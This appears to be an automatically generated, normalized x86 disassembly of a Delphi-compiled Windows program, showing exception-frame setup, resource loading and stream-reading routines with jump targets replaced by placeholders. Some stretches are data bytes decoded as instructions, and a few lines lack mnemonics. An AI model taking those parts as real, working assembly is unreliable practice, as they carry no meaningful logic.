push sub_41c2c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_405728
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_409d70
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40db38
call sub_404ec4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c2cd
lea eax [ ebp - 0x10 ]
call sub_405530
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_41c2d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_41c234
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_41bdb4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
push ebp
call sub_41c234
pop ecx
sub_41c340
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_404640
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_41c388
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_402f00
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_41c3d0
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_402f1c
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_41c400
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
les eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les ax [ ecx ]
sbb [ eax ] al
add [ eax ] al
rcl [ eax ] 0x40
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ ebp + eax * 8 + 0x41 ] dh
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x100040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc al 0x0
add [ eax ] al
or dl [ eax + edx * 2 + 0x72 ]
outsd
jo r-xdata
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ ebp + eax * 8 + 0x540e0041 ] al
push eax
jb r-xdata
imul edi [ eax + 0x75 ] r-xdata
rol ah 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
les eax [ ecx ]
sbb [ eax ] al
add [ eax ] al
cld
retn
fsubp st3
add [ ebx + 0xf ] eax
mov dh 0x13
jo r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
outsb
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_405620
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_405a84
mov al 0x1
test dl dl
je r-xdata
inc ebx
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
inc esi
imul edi [ eax + 0x75 ] 0x8b559070
in al dx
push ebx
push esi
test dl dl
je r-xdata
movzx edx [ ebx ]
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_405584
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_405584
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41c49e
inc ecx
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ ebp + eax * 8 + 0x540e0041 ] al
push eax
jb r-xdata
fsubp st3
add [ ebx + 0xf ] eax
mov dh 0x13
jo r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
outsb
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_405620
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_405a84
mov al 0x1
test dl dl
je r-xdata
inc ebx
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
inc esi
imul edi [ eax + 0x75 ] 0x8b559070
in al dx
push ebx
push esi
test dl dl
je r-xdata
movzx edx [ ebx ]
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_405584
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_405584
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41c4d4
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_405584
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_405584
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_41c52c
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
movzx edx [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_405620
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_405a84
mov al 0x1
inc ebx
sub_41c584
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41c5fb
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_40700c
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_416c80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c602
lea eax [ ebp - 0x4 ]
call sub_40700c
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_4164e8
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_40700c
mov ecx eax
mov eax esi
pop edx
call sub_40f978
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_40700c
sub_41c608
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41c6b1
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c6b8
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov [ ebp - 0xc ] ebx
jmp r-xdata
mov [ ebp - 0x8 ] edi
movzx eax [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_405620
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4204e4
mov esi eax
test esi esi
jne r-xdata
add al 0xd3
sub al 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_409a84
test al al
je r-xdata
inc ebx
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_41c6d4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_4198f4
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_4198f4
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_419740
sub_41c70c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_4198f4
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_4198f4
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_41978c
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_419740
sub_41c754
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_41c910
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_419c08
mov edi eax
xor eax eax
push ebp
push sub_41c8f1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c8f8
mov eax [ rw-data ]
call sub_419c6c
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41c8d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41c880
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_419898
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_4193e4
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c887
mov eax [ ebp - 0x8 ]
call sub_404650
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_416614
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_41c6d4
pop ecx
mov edx esi
mov eax edi
call sub_41978c
mov eax ebx
call sub_404650
jmp r-xdata
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x2
jne r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_41c70c
pop ecx
inc esi
push ebp
mov eax [ ebx + 0x4 ]
call sub_41c70c
pop ecx
inc esi
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_41c608
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
jmp r-xdata
sub_41c887
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_404650
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_419898
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
sub_41c920
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_419c08
mov edi eax
xor eax eax
push ebp
push sub_41c9bb
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_419c6c
retn
mov edx ebx
mov eax edi
call sub_419898
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_41978c
mov eax esi
call sub_404650
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_409a84
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_41c9cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_419c08
mov edi eax
xor eax eax
push ebp
push sub_41ca43
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_419c6c
retn
mov edx ebx
mov eax edi
call sub_419898
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_41978c
mov eax esi
call sub_404650
sub_41ca74
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf4
call sub_404ec4
pop ecx
pop edx
pop ebx
retn
sub_41cab8
push ebx
push esi
push edi
call sub_404a1c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41c3d0
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_41caf4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_41ebc0
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_41ecd0
call sub_41ca68
sub_41cb18
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x80 ]
mov eax esi
call sub_409a84
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x80 ]
call sub_405530
sub_41cb54
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x80 ]
mov eax ebx
call sub_409a84
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ebc0
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41cc1e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_41d058
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41d058
mov eax [ ebp - 0x4 ]
mov [ eax + 0x88 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cc25
mov eax [ ebp - 0x8 ]
call sub_404650
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41ecd0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x88 ] 0x1
call sub_41ca68
sub_41cc50
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x62 ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
sub_41cc74
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov [ ebp - 0x9 ] 0x1
lea eax [ ebp - 0x10c ]
mov edx [ ebp - 0x8 ]
mov ecx 0xff
call sub_4057e8
lea edx [ ebp - 0x10c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4048d4
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
cmp [ esi ] 0x0
sete [ ebp - 0x9 ]
push esi
lea eax [ ebp - 0x9 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov [ esi ] eax
cmp [ ebp - 0x9 ] 0x0
je r-xdata
sub_41ccfc
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_4057e8
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_4048d4
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
call sub_41ca68
sub_41cd64
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_419c08
mov esi eax
xor edx edx
push ebp
push sub_41cdd4
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cddb
mov eax [ rw-data ]
call sub_419c6c
retn
mov edx ebx
mov eax esi
call sub_419898
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_404650
mov edx ebx
mov eax esi
call sub_41978c
sub_41cde0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41cf16
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cf1d
lea eax [ ebp - 0x4 ]
call sub_405530
retn
xor edx edx
push ebp
push sub_41cef9
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_41cf48
retn
inc eax
mov [ ebp - 0x10 ] eax
xor esi esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_419898
call sub_41cd64
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x7a ] 0x0
je r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_41c52c
test al al
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edi [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x7c ]
call [ edi + 0x78 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_419898
mov ebx eax
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_4055c8
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_41c608
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_419898
mov edx eax
mov eax [ rw-data ]
call sub_419b80
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_41998c
jmp r-xdata
inc esi
dec [ ebp - 0x10 ]
jne r-xdata
sub_41cf24
push ebx
mov ebx eax
mov eax ebx
call sub_41d01c
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_41b734
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_41cf48
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_404650
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_419898
call sub_404650
inc edi
dec esi
jne r-xdata
sub_41cf84
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_404528
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_418f2c
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x84 ]
test eax eax
je r-xdata
mov eax ebp
call sub_4045dc
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_418fa4
mov edi eax
mov edx [ esp + 0x4 ]
call sub_418ea4
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_404544
test al al
jne r-xdata
sub_41d058
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_41d0a4
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_41d0a4
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
call sub_404ec4
sub_41d0f4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41d144
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41ea20
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
dec eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax [ ebp - 0x4 ]
movzx ebx [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d14b
lea eax [ ebp - 0x4 ]
call sub_405530
retn
call sub_41ca68
sub_41d154
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41d1a0
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41eadc
mov eax [ ebp - 0x4 ]
call sub_405ec8
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx ebx [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d1a7
lea eax [ ebp - 0x4 ]
call sub_405d28
retn
call sub_41ca68
sub_41d1b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41d250
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41cc3c
test al al
jne r-xdata
mov eax ebx
call sub_41cc3c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a0bc
jmp r-xdata
mov eax ebx
call sub_41d034
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_41dcf8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d257
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_41a09c
mov esi eax
mov eax ebx
call sub_41dcf0
jmp r-xdata
